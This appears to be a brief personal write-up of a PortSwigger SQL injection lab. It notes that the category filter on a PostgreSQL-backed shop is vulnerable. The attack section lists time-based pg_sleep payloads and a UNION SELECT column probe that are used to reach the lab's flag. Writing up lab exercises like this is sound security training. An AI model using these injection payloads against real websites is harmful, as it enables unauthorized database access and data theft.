---
platform: PortSwiggerLabs
categories: Web
---
#sqli 

# Functionality
- login form
- search

# Scanning
category query vulnerable identified it as postgresql 

# Attack 
```sql
/filter?category=Accessories'%7c%7cpg_sleep(20)-- 
/filter?category=Accessories'||pg_sleep(20)--
/filter?category=Accessories'||pg_sleep(20)--
```
attack lets see the rows returned and try to return the value

```sql
Accessories' UNION SELECT 'abc','abc'--
```
get flag from there